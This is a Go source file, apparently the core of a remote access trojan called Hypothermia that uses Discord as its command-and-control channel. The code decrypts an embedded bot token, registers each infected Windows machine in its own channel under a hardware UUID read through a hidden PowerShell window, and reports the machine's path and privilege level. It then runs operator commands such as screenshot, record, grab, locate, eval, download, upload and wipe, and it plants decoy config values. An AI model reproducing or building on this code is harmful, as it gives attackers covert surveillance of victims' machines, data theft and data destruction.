package bot

import (
	"bytes"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"

	"Hypothermia/config"
	"Hypothermia/src/bot/commands"
	"Hypothermia/src/utils"
	"Hypothermia/src/utils/crypto"

	"github.com/bwmarrin/discordgo"
)

type Command interface {
	Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string)
	Name() string
	Info() string
}

var commandsList = make(map[string]Command)
var channelId string

func Init() {
	OnStartup()
	register()

	var fakeStuff = map[string]string{
		"BOT_TOKEN":   "Bot" + config.FakeToken,
		"CATEGORY_ID": "Category" + config.FakeCategory,
		"SERVER_ID":   "Server" + config.FakeServer,
	}

	if rand.Intn(1032) == 193 {
		fmt.Println(fakeStuff)
	}

	err := validateEncrypted(config.BotToken)
	if err != nil {
		fmt.Println("manager/1 -", err)
		fmt.Scanln()
		return
	}

	err = validateEncrypted(config.ServerId)
	if err != nil {
		fmt.Println("manager/2 -", err)
		fmt.Scanln()
		return
	}

	err = validateEncrypted(config.CategoryId)
	if err != nil {
		fmt.Println("manager/3 -", err)
		fmt.Scanln()
		return
	}

	realToken := utils_crypto.DecryptBasic(config.BotToken)
	dg, err := discordgo.New("Bot " + realToken)
	if err != nil {
		fmt.Println("manager/4 -", err)
		fmt.Scanln()
		return
	}

	dg.AddHandler(handler)

	err = dg.Open()
	if err != nil {
		fmt.Println("manager/5 -", err)
		return
	}

	categoryId := utils_crypto.DecryptBasic(config.CategoryId)
	hwid := getHWID()

	channel, code := getChannel(dg, categoryId, hwid)
	channelId = channel

	path, err := os.Executable()
	if err != nil {
		path = "?"
	} else {
		path, err = filepath.Abs(path)
		if err != nil {
			path = "?"
		}
	}

	var admin string
	isAdmin, err := utils.IsAdmin()
	if err != nil {
		admin = "Could not get"
	} else {
		if isAdmin {
			admin = "Admin"
		} else {
			admin = "User"
		}
	}

	var msg string
	if code == 1 {
		msg = "Hypotermia successfully connected to new machine."
	} else if code == 2 {
		msg = "Hypotermia successfully reconnected."
	}

	dg.ChannelMessageSend(
		channel,
		fmt.Sprintf(
			"@here "+
				"%s [%d.%d.%d]\n\n"+
				"UUID: %s\n"+
				"Running in: %s\n"+
				"Running as: %s\n",
			msg, config.Major, config.Minor,
			config.Patch, hwid, path, admin,
		),
	)

	select {}
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	defer func() {
		err := recover()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf("⚠️ FATAL ERROR: %v", err), m.Reference())
		}
	}()

	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.ChannelID != channelId {
		return
	}

	if !strings.HasPrefix(m.Content, config.Prefix) {
		return
	}

	args := strings.Fields(m.Content[len(config.Prefix):])
	if len(args) == 0 {
		return
	}

	cmdName := strings.ToLower(args[0])
	if cmdName == "help" {
		var helpStr string = "commands:\n"

		for _, cmd := range commandsList {
			helpStr += cmd.Name() + " - " + cmd.Info() + "\n"
		}

		helpStr += fmt.Sprintf("\nprefix: `%s`", config.Prefix)

		s.ChannelMessageSendReply(m.ChannelID, helpStr, m.Reference())
		return
	}

	cmd, exists := commandsList[cmdName]
	if exists {
		cmd.Run(s, m, args[1:])
	} else {
		s.ChannelMessageSendReply(m.ChannelID, "This command does not exist, do `>help` for help.", m.Reference())
	}
}

func register() {
	commandsList["audio"] = &commands.AudioCommand{}
	commandsList["brightness"] = &commands.LightCommand{}
	commandsList["download"] = &commands.DownloadCommand{}
	commandsList["env"] = &commands.EnvCommand{}
	commandsList["eval"] = &commands.EvalCommand{}
	commandsList["grab"] = &commands.GrabCommand{}
	commandsList["input"] = &commands.InputCommand{}
	commandsList["locate"] = &commands.LocateCommand{}
	commandsList["notif"] = &commands.NotifCommand{}
	commandsList["ping"] = &commands.PingCommand{}
	commandsList["record"] = &commands.RecordCommand{}
	commandsList["setting"] = &commands.SettingCommand{}
	commandsList["ss"] = &commands.ScreenShotCommand{}
	commandsList["tree"] = &commands.TreeCommand{}
	commandsList["tts"] = &commands.TTSCommand{}
	commandsList["upload"] = &commands.UploadCommand{}
	commandsList["volume"] = &commands.VolumeCommand{}
	commandsList["wallpaper"] = &commands.WallpaperCommand{}
	commandsList["wipe"] = &commands.WipeCommand{}
}

func validateEncrypted(data string) error {
	if len(data) == 0 {
		return fmt.Errorf("data is empty")
	}

	regex := regexp.MustCompile(`[a-zA-Z\.\-_]`)
	if regex.MatchString(data) {
		return fmt.Errorf("contains visible data")
	}

	return nil
}

func getChannel(s *discordgo.Session, categoryId string, name string) (id string, code int) {
	serverId := utils_crypto.DecryptBasic(config.ServerId)
	channels, err := s.GuildChannels(serverId)
	if err != nil {
		return "", 0
	}

	name = strings.ToLower(strings.TrimSpace(name))
	for _, channel := range channels {
		channelName := strings.ToLower(strings.TrimSpace(channel.Name))

		if channelName == name && channel.Type == discordgo.ChannelTypeGuildText && channel.ParentID == categoryId {
			return channel.ID, 2
		}
	}

	channel, err := s.GuildChannelCreateComplex(serverId, discordgo.GuildChannelCreateData{
		Name:     name,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryId,
	})

	if err != nil {
		return "", 0
	}

	return channel.ID, 1
}

func getHWID() string {
	cmd := exec.Command("powershell", "-Command", "(Get-CimInstance Win32_ComputerSystemProduct).UUID")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	var out bytes.Buffer
	cmd.Stdout = &out

	err := cmd.Run()
	if err != nil {
		return "UNK_GUID_NF"
	}

	return strings.TrimSpace(out.String())
}
